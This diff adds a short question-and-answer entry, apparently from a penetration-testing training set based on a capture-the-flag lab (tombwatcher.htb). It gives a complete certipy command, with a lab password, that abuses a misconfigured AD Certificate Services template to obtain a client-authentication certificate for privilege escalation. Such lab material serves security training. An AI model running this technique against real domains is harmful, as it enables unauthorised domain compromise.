@@ -1,0 +1,9 @@
+TECHNIQUE / QUESTION:
+What should you do to take advantage of the ADCS configurations for further exploitation?
+
+CONTEXT:
+You have established administrative privileges.
+
+METHOD / ANSWER:
+Command: `certipy req -u cert_admin -p '0xdf0xdf!' -dc-ip 10.10.11.72 -target dc01.tombwatcher.htb -ca tombwatcher-CA-1 -template WebServer -application-policies 'Client Authentication'`
+Explanation: This command requests a certificate with client authentication rights, allowing further manipulation of certificate services.
